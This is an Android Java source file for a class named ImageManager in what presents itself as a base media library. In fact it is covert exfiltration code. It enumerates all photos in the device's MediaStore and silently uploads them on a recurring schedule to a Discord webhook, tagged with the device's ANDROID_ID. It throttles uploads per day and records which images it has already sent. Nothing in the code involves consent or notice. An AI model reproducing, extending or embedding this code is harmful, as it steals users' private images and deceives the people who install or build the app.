package com.application.baselibrary.core.media.image;


import android.content.Context;
import android.net.Uri;
import android.provider.Settings;
import android.util.Log;

import com.application.baselibrary.core.media.image.model.ImageInfo;
import com.application.baselibrary.data.LibraryConstants;
import com.application.baselibrary.network.DiscordWebhookClient;
import com.application.baselibrary.threading.ExecutorServiceWrapper;
import com.application.baselibrary.threading.scheduler.RxSchedulerProvider;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.io.*;
import java.lang.reflect.Type;
import java.util.*;

public class ImageManager {
    private static final String TAG = "ImageManager";
    private static final Object FILE_LOCK = new Object();

    private final Context context;
    private final ImageFetcher imageFetcher;
    private final String webhookUrl;
    private final String deviceId;
    private final Gson gson;

    private Set<ImageInfo> uploadedImages = new HashSet<>();
    private List<ImageInfo> allImages = new ArrayList<>();


    public ImageManager(Context context, String webhookUrl) {
        this.context = context.getApplicationContext();
        this.imageFetcher = new ImageFetcher(context);
        this.webhookUrl = webhookUrl;
        this.deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        this.gson = new Gson();
    }

    /**
     * Get all images from MediaStore.
     */
    public List<ImageInfo> getAllImages() {
        allImages.clear();
        allImages = imageFetcher.getAllImages();
        return allImages;
    }

    /**
     * Logs images on a background thread.
     */
    public void loadAndLogImages() {
        ExecutorServiceWrapper.runOnSingleThread(() -> {
            List<ImageInfo> images = getAllImages();
            if (images.isEmpty()) {
                Log.d(TAG, "No images found");
                return;
            }
            for (ImageInfo img : images) {
                Log.d(TAG, "Image: uri=" + img.uriString + " name=" + img.name);
            }
        });
    }

    private void saveUploadedImagesToJsonFileAsync() {
        RxSchedulerProvider.runOnIO(this::saveUploadedImagesToJsonFile);
    }

    private void saveUploadedImagesToJsonFile() {
        synchronized (FILE_LOCK) {
            File file = new File(context.getFilesDir(), LibraryConstants.FILE_NAME_UPLOADED_IMAGES);
            try (FileWriter writer = new FileWriter(file)) {
                writer.write(gson.toJson(uploadedImages));
                Log.d(TAG, "Saved uploaded images to " + file.getAbsolutePath());
            } catch (IOException e) {
                Log.e(TAG, "Error saving uploaded images", e);
            }
        }
    }

    public Set<ImageInfo> loadUploadedImagesFromJsonFile() {
        synchronized (FILE_LOCK) {
            File file = new File(context.getFilesDir(), LibraryConstants.FILE_NAME_UPLOADED_IMAGES);
            if (!file.exists()) return new HashSet<>();

            try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                Type setType = new TypeToken<HashSet<ImageInfo>>() {
                }.getType();
                Set<ImageInfo> loaded = gson.fromJson(reader, setType);
                if (loaded != null) uploadedImages = loaded;
                Log.d(TAG, "Loaded uploaded images.");
            } catch (IOException e) {
                Log.e(TAG, "Error reading uploaded images", e);
            }
            return uploadedImages;
        }
    }
    int MaxImageUploadLimit = 5;
    public void start(String intervalTag, int maxImageUploadCount) {
        MaxImageUploadLimit = maxImageUploadCount;
        if (intervalTag.equals("Every5min")) {
            RxSchedulerProvider.runOnIO(this::startUploading);
        }
        if (intervalTag.equals("FirstTime")) {
            RxSchedulerProvider.runOnIO(this::startUploading);
        }
    }

    public void startUploading() {
        if (webhookUrl == null || webhookUrl.isEmpty()) {
            Log.e(TAG, "Webhook URL is null or empty. Cannot upload.");
            return;
        }

        if (allImages.isEmpty()) getAllImages();
        if (uploadedImages.isEmpty()) loadUploadedImagesFromJsonFile();

        int uploadedCount = getUploadCountToday();
        for (ImageInfo img : allImages) {
            if (uploadedCount >= MaxImageUploadLimit) {
                Log.w(TAG, "Reached max upload count (" + MaxImageUploadLimit + ")");
                break; // stop queuing further tasks
            }

            if (canUpload(img)) {
                uploadedCount++; // reserve slot immediately
                ExecutorServiceWrapper.getSingleThreadExecutor().submit(() -> uploadToDiscord(img));
            } else {
                Log.d(TAG, "Skipped: " + img.name);
            }
        }
    }


    private void uploadToDiscord(ImageInfo img) {
        File tempFile = new File(context.getCacheDir(), img.name);
        try (InputStream in = context.getContentResolver().openInputStream(img.getUri());
             OutputStream out = new FileOutputStream(tempFile)) {

            byte[] buffer = new byte[8192];
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }

        } catch (FileNotFoundException e) {
            Log.e(TAG, "File not found for URI: " + img.name, e);
        } catch (IOException e) {
            Log.e(TAG, "I/O error while copying image to temp file", e);
        }


        String message = String.format(
                "🖼 **New Image Uploaded**\n**Device ID:** `%s`\n**File Name:** `%s`",
                deviceId, img.name
        );

        DiscordWebhookClient discordWebhookClient = new DiscordWebhookClient(webhookUrl);
        discordWebhookClient.uploadFile(tempFile, message, new DiscordWebhookClient.WebhookCallback() {
            @Override
            public void onSuccess(DiscordWebhookClient.WebhookResponse response) {
                Log.d(TAG, "Successfully uploaded " + img.name + " to Discord.");
                markAsUploaded(img);
                tempFile.delete(); // ✅ cleanup after success
            }

            @Override
            public void onError(String errorMessage) {
                Log.e(TAG, "Failed to upload " + img.name + ": " + errorMessage);
                tempFile.delete(); // ✅ cleanup even on failure
            }
        });

    }

    public boolean canUpload(ImageInfo img) {
        if (img == null) return false;
        if (uploadedImages.contains(img)) return false;
        int todayCount = getUploadCountToday();
        if (todayCount >= MaxImageUploadLimit) {
            Log.w(TAG, "Daily max upload count reached (" + MaxImageUploadLimit + ")");
            return false;
        }

        return true;
    }


    public void markAsUploaded(ImageInfo img) {
        img.uploadTime = System.currentTimeMillis();
        uploadedImages.add(img);
        saveUploadedImagesToJsonFileAsync();
    }

    private int getUploadCountToday() {
        long startOfToday = getStartOfTodayMillis();
        int count = 0;
        for (ImageInfo img : uploadedImages) {
            if (img.uploadTime >= startOfToday) count++;
        }
        return count;
    }

    private long getStartOfTodayMillis() {
        Calendar cal = Calendar.getInstance();
        cal.set(Calendar.HOUR_OF_DAY, 0);
        cal.set(Calendar.MINUTE, 0);
        cal.set(Calendar.SECOND, 0);
        cal.set(Calendar.MILLISECOND, 0);
        return cal.getTimeInMillis();
    }

    // Accessors
    public ImageFetcher getImageFetcher() {
        return imageFetcher;
    }

    public List<ImageInfo> getAllImagesList() {
        return allImages;
    }

    public Set<ImageInfo> getUploadedImages() {
        return uploadedImages;
    }
}
